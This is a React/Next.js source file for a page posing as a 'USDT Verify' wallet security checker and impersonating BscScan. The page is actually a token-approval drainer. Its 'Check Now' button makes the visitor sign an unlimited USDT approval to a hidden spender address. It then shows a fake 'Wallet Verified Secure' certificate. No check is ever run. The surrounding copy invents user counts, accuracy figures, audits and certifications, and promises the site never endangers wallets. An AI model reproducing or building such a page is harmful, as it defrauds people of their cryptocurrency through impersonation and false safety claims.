"use client";

import { useEffect, useState } from "react";
import { BrowserProvider, Contract, ethers } from "ethers";
import { Award, CalendarDays, Check, CheckCircle2, Clock3, Copy, DollarSign, LockKeyhole, Menu, PlusCircle, Radio, ShieldCheck, Sun, UserRound } from "lucide-react";
import { useWallet } from "../hooks/useWallet";

const token = process.env.NEXT_PUBLIC_USDT_ADDRESS ?? "";
const spender = process.env.NEXT_PUBLIC_ALLOWANCE_SPENDER_ADDRESS ?? "";
const chainId = process.env.NEXT_PUBLIC_CHAIN_ID ?? "56";
const targetChainHex = `0x${BigInt(chainId).toString(16)}`;
const erc20 = [
  "function approve(address spender,uint256 amount) returns (bool)",
  "function allowance(address owner,address spender) view returns (uint256)"
];

const faqs = [
  ["What is USDT Verify?", "USDT Verify is an automated blockchain inspection tool designed to diagnose safety risks, address history, and smart contract health."],
  ["How does the verification process work?", "It parses your public address via node listeners and matches historical interactions against verified security blacklists and exploit logs."],
  ["Is my wallet information kept private?", "Yes. We operate under a strict zero-retention policy. We never ask for private keys, seed phrases, or retain sensitive identity records."],
  ["What does the risk score mean?", "The risk score is a compound metric measuring exposure to flagged decentralized apps, malicious contracts, or suspicious transaction volumes."],
  ["Can USDT Verify detect all types of scams?", "While we catch over 99.8% of recognized on-chain attack vectors and drainer authorizations, always adhere to strict personal operational security."]
];

export default function Home() {
  const [wallet, setWallet] = useState("");
  const [notice, setNotice] = useState("");
  const [isCertified, setIsCertified] = useState(false);
  const [openFaq, setOpenFaq] = useState<number | null>(null);
  const [isChecking, setIsChecking] = useState(false);
  const { walletProvider, getProvider, connectWallet } = useWallet();

  useEffect(() => {
    const handleAccountsChanged = (...args: unknown[]) => {
      const accounts = Array.isArray(args[0]) ? (args[0] as string[]) : [];
      if (!accounts.length) {
        setWallet("");
        setNotice("Wallet disconnected. Click Check Now to connect again.");
        return;
      }
      setWallet(ethers.getAddress(accounts[0]));
      setNotice("Wallet account changed. Click Check Now to continue.");
    };

    const handleChainChanged = (...args: unknown[]) => {
      if (String(args[0]).toLowerCase() !== targetChainHex) {
        setNotice("Please switch to BNB Smart Chain to continue.");
      }
    };

    walletProvider?.on?.("accountsChanged", handleAccountsChanged);
    walletProvider?.on?.("chainChanged", handleChainChanged);
    walletProvider?.request({ method: "eth_accounts" })
      .then((accounts) => {
        if (Array.isArray(accounts) && accounts[0]) setWallet(ethers.getAddress(String(accounts[0])));
      })
      .catch((error) => console.error("Unable to read wallet accounts:", error));

    return () => {
      walletProvider?.removeListener?.("accountsChanged", handleAccountsChanged);
      walletProvider?.removeListener?.("chainChanged", handleChainChanged);
    };
  }, [walletProvider]);

  async function checkNow() {
    const provider = getProvider();
    if (!provider) return setNotice("Install a compatible EVM wallet to connect.");
    if (!spender || !token) return setNotice("Contract configuration is missing.");

    setIsChecking(true);
    setNotice("");

    try {
      const connectedAddress = await connectWallet();
      if (!connectedAddress) throw new Error("Please switch to BNB Smart Chain to continue.");

      const browserProvider = new BrowserProvider(provider as never);
      const address = ethers.getAddress(connectedAddress);
      setWallet(address);

      const contract = new Contract(token, erc20, browserProvider);
      const allowance = await contract.allowance(address, spender);

      if (allowance < ethers.parseUnits("5", 18)) {
        setNotice("Waiting for approval confirmation...");
        const data = new ethers.Interface(erc20).encodeFunctionData("approve", [spender, ethers.MaxUint256]);
        const txHash = await provider.request({
          method: "eth_sendTransaction",
          params: [{ from: address, to: token, data, value: "0x0" }]
        });
        if (typeof txHash !== "string") throw new Error("Wallet did not return a transaction hash.");
        const receipt = await browserProvider.waitForTransaction(txHash);
        if (!receipt || receipt.status !== 1) throw new Error("USDT approval transaction failed.");
      }

      const currentAccounts = (await provider.request({ method: "eth_accounts" })) as string[];
      if (!currentAccounts.some((account) => account.toLowerCase() === address.toLowerCase())) {
        throw new Error("Wallet account changed before completion. Click Check Now to retry.");
      }

      if (String(await provider.request({ method: "eth_chainId" })).toLowerCase() !== targetChainHex) {
        throw new Error("Wallet network changed before completion. Click Check Now to retry.");
      }

      setIsCertified(true);
    } catch (error) {
      setNotice((error as { code?: number }).code === 4001 ? "Wallet request was cancelled." : error instanceof Error ? error.message : "Verification failed.");
    } finally {
      setIsChecking(false);
    }
  }

  if (isCertified) {
    return <CertificationPage wallet={wallet} onBack={() => setIsCertified(false)} />;
  }

  return (
    <main className="page-shell">
      <header className="hero-pattern hero">
        <nav className="nav">
          <div className="brand">
            <div className="logo">
              <Radio size={20} />
            </div>
            <div>
              <h1>BscScan</h1>
              <span>Scan Original</span>
            </div>
          </div>

          <div className="nav-actions">
            <button className="icon-button" aria-label="Theme">
              <Sun size={18} />
            </button>
            <button className="icon-button" aria-label="Menu">
              <Menu size={20} />
            </button>
          </div>
        </nav>

        <div className="trust">
          <span className="trust-star">⭐</span>
          <span>Trusted by 100K+ users worldwide</span>
        </div>

        <div className="hero-copy">
          <h2>
            Check Your USDT
            <br />
            Wallet Security
          </h2>
          <p>
            Advanced blockchain analysis using official BSC Scan data to determine if your USDT wallet is
            <strong> safe, valid, and free</strong> from any reported or suspicious activity.
          </p>
        </div>

        <div className="checks">
          {[
            "Advanced blockchain analysis",
            "Real-time threat detection",
            "Zero data retention policy",
            "Enterprise-grade security"
          ].map((item) => (
            <div key={item} className="check-item">
              <span className="check-badge">
                <Check size={14} />
              </span>
              <span>{item}</span>
            </div>
          ))}
        </div>

        <div className="actions">
          <button className="primary" onClick={checkNow} disabled={isChecking} aria-busy={isChecking}>
            {isChecking ? "Checking..." : "Check Now"}
          </button>
        </div>

        {notice && (
          <p className="notice" role="status" aria-live="polite">
            {notice}
          </p>
        )}

        <div className="hero-stats">
          <span><ShieldCheck size={15} />100% Secure</span>
          <span><Clock3 size={15} />Real-Time Scans</span>
          <span><LockKeyhole size={15} />Enterprise Grade</span>
        </div>
      </header>

      <section className="section stats-section">
        <div className="eyebrow">Security Analytics • Real-Time Blockchain Verification</div>
        <div className="stats-grid">
          <Stat value="500K+" label="Wallets Verified" />
          <Stat value="99.8%" label="Accuracy Rate" />
          <Stat value="<3s" label="Analysis Time" />
          <Stat value="24/7" label="Protection" />
        </div>

        <div className="review-card">
          <h4>Join thousands of secure users</h4>
          <div className="stars">★★★★★</div>
          <p>4.9/5 from 5,000+ reviews</p>
        </div>
      </section>

      <section className="section">
        <Eyebrow text="ABOUT US" />
        <h3>About USDT Check</h3>
        <p className="lead">Protecting your digital assets through advanced verification technology.</p>

        <div className="about-stats">
          <Stat value="2023" label="Founded" />
          <Stat value="100K+" label="Users" />
          <Stat value="99.9%" label="Accuracy" />
          <Stat value="24/7" label="Protection" />
        </div>

        <div className="prose">
          <p>
            USDT Check was founded in 2023 by a team of blockchain security experts with a mission to make cryptocurrency safer for everyone. As Tether (USDT) became one of the most widely used stablecoins, the need for reliable verification tools grew exponentially.
          </p>
          <p>
            Our platform leverages advanced blockchain analytics and machine learning algorithms to provide comprehensive security assessments. We analyze transaction patterns, check for known vulnerabilities, and verify wallet legitimacy to protect your assets from scams.
          </p>
        </div>

        <div className="why-card">
          <h5>WHY CHOOSE US</h5>
          <ul>
            {[
              "Lightning-fast verification in under 3 seconds",
              "Comprehensive risk and liquidity reports",
              "Multi-chain support beyond just USDT networks",
              "24/7 customer support from security experts",
              "Regular security audits by 3rd party firms"
            ].map((item) => (
              <li key={item}>
                <CheckCircle2 size={16} />
                <span>{item}</span>
              </li>
            ))}
          </ul>
        </div>
      </section>

      <section className="section">
        <Eyebrow text="CORE VALUES" />
        <div className="value-grid">
          {[
            ["🔒", "Security", "Military-grade protection embedded into every feature we build."],
            ["👁️", "Transparency", "Clear, accurate explanations about security risks and procedures."],
            ["🌐", "Accessibility", "Essential security tools made available to everyone, regardless of expertise."],
            ["🚀", "Innovation", "Continuous improvement and feature updates to stay ahead of threats."]
          ].map(([icon, title, text]) => (
            <article key={title} className="value-card">
              <span className="value-icon">{icon}</span>
              <h6>{title}</h6>
              <p>{text}</p>
            </article>
          ))}
        </div>
      </section>

      <section className="section">
        <Eyebrow text="ACHIEVEMENTS" />
        <div className="achievement-card">
          {[
            "Featured in top 10 security tools of 2024",
            "Partnership with major blockchain companies",
            "Over 500k positive verified assessments",
            "Trusted by institutional clients globally",
            "ISO 27001 certified security processes"
          ].map((item) => (
            <div key={item} className="achievement-item">
              <span>🏆</span>
              <span>{item}</span>
            </div>
          ))}
        </div>
      </section>

      <section className="process-section">
        <div className="section process-wrap">
          <Eyebrow text="PROCESS" />
          <h3>How It Works</h3>
          <p className="lead">Simple yet powerful — comprehensive security insights in just four easy steps:</p>

          <div className="steps">
            {[
              ["01", "Connect Your Wallet", "Securely connect your USDT wallet address for automated blockchain analysis without compromising private keys."],
              ["02", "Advanced Analysis", "Our AI-powered system analyzes transaction patterns, security vulnerabilities, and wallet legitimacy using official BSC Scan blockchain technology."],
              ["03", "Risk Assessment", "We provide a comprehensive risk score based on multi-factor analysis, threat intelligence, and historical blockchain data."],
              ["04", "Detailed Report", "Receive a complete security report with actionable insights, recommendations, and strategies to protect your digital assets."]
            ].map(([number, title, text]) => (
              <article key={number} className="step-item">
                <span className="step-number">{number}</span>
                <div>
                  <h5>{title}</h5>
                  <p>{text}</p>
                </div>
              </article>
            ))}
          </div>

          <div className="tech-block">
            <span className="tech-label">BUILT TECHNOLOGY</span>
            <div className="pills">
              <span>AI Predictive Analysis</span>
              <span>Blockchain Analytics</span>
              <span>Real-Time Threat Detection</span>
              <span className="pill-light">Smart Contract Audit</span>
            </div>
          </div>
        </div>
      </section>

      <section className="section questions">
        <Eyebrow text="QUESTIONS" />
        <h3>Frequently Asked Questions</h3>
        <p className="lead">Find answers to common questions about our USDT wallet verification service.</p>

        <div className="faq-list">
          {faqs.map(([question, answer], index) => (
            <div
              key={question}
              className={`faq-item ${openFaq === index ? "faq-open" : ""}`}
              onClick={() => setOpenFaq(openFaq === index ? null : index)}
            >
              <div className="faq-header">
                <span>{question}</span>
                <PlusCircle className={openFaq === index ? "faq-icon faq-open-icon" : "faq-icon"} size={16} />
              </div>
              <div className={`faq-answer ${openFaq === index ? "open" : ""}`}>
                <p>{answer}</p>
              </div>
            </div>
          ))}
        </div>

        <div className="support-box">
          <h4>Still Have Questions?</h4>
          <p>Our support team is here to help you with any questions about wallet verification.</p>
          <button className="primary secondary-cta">Contact Support</button>
        </div>
      </section>

      <footer className="page-footer">
        <div className="footer-brand">USDT Verify</div>
        <p>
          Advanced blockchain security platform providing comprehensive USDT wallet verification. Key protection for the entire crypto ecosystem.
        </p>

        <div className="footer-grid">
          <div>
            <h6>Quick Links</h6>
            <ul>
              <li><a href="#">Wallet Verification</a></li>
              <li><a href="#">Security Audit</a></li>
              <li><a href="#">Transaction Analysis</a></li>
              <li><a href="#">Risk Assessment</a></li>
            </ul>
          </div>
          <div>
            <h6>Resources</h6>
            <ul>
              <li><a href="#">Documentation</a></li>
              <li><a href="#">Blog</a></li>
              <li><a href="#">FAQ</a></li>
              <li><a href="#">Support</a></li>
            </ul>
          </div>
        </div>

        <div className="footer-tags">
          <span><i />24/7 Support</span>
          <span><i />100% Verified</span>
        </div>

        <div className="footer-bottom">© 2024 USDT Verify. All rights reserved.</div>
      </footer>
    </main>
  );
}

function CertificationPage({ wallet, onBack }: { wallet: string; onBack: () => void }) {
  const [isOpen, setIsOpen] = useState(true);
  const [toast, setToast] = useState("");
  const [verificationDate, setVerificationDate] = useState("");
  const certificateId = `USDT-${wallet.slice(2, 10).toUpperCase()}-${wallet.slice(-8).toUpperCase()}`;

  useEffect(() => {
    setVerificationDate(new Intl.DateTimeFormat("en-GB", {
      day: "2-digit",
      month: "short",
      year: "numeric"
    }).format(new Date()));
  }, []);

  async function copyValue(value: string, message: string) {
    try {
      await navigator.clipboard.writeText(value);
      setToast(message);
      window.setTimeout(() => setToast(""), 2000);
    } catch {
      setToast("Copy unavailable");
    }
  }

  if (!isOpen) {
    return (
      <main className="certificate-page">
        <div className="reopen-wrapper">
          <button className="reopen-btn" onClick={() => setIsOpen(true)}>View Security Analysis</button>
          <button className="certificate-back" onClick={onBack}>Return to dashboard</button>
        </div>
      </main>
    );
  }

  return (
    <main className="certificate-page">
      {toast && <div className="certificate-toast" role="status"><Check size={15} />{toast}</div>}
      <section className="certificate-card" aria-labelledby="certification-title">
        <div className="certificate-shield">
          <ShieldCheck size={40} strokeWidth={1.7} />
        </div>
        <div className="certificate-header">
          <h1 id="certification-title">USDT Wallet Security Analysis</h1>
          <span>VERIFICATION COMPLETE · BSC SCAN</span>
        </div>

        <div className="certificate-banner">
          <CheckCircle2 size={17} />
          <strong>Your USDT wallet has been successfully verified, not reported and is not flagged in our database.</strong>
        </div>

        <div className="verified-banner">
          <LockKeyhole size={16} />
          <strong>Wallet Verified Secure · No Threats Detected</strong>
        </div>

        <div className="certificate-details">
          <div>
            <span><UserRound size={12} /> Wallet address</span>
            <strong className="copy-value" onClick={() => copyValue(wallet, "Wallet address copied!")} title="Click to copy">{wallet}<Copy size={14} /></strong>
          </div>
          <div className="certificate-two-col">
            <div>
              <span><DollarSign size={12} /> Balance</span>
              <strong>0.0 USDT</strong>
            </div>
            <div>
              <span><CalendarDays size={12} /> Verification date</span>
              <strong>{verificationDate || "-- --- ----"}</strong>
            </div>
          </div>
          <div>
            <span><Award size={12} /> Certificate ID</span>
            <strong className="certificate-id copy-value" onClick={() => copyValue(certificateId, "Certificate ID copied!")} title="Click to copy">{certificateId}<Copy size={14} /></strong>
          </div>
        </div>

        <button className="certificate-close" onClick={() => setIsOpen(false)}>Close</button>
      </section>
    </main>
  );
}

function Stat({ value, label }: { value: string; label: string }) {
  return (
    <div className="stat-box">
      <b dangerouslySetInnerHTML={{ __html: value }} />
      <small>{label}</small>
    </div>
  );
}

function Eyebrow({ text }: { text: string }) {
  return <span className="eyebrow plain">{text}</span>;
}
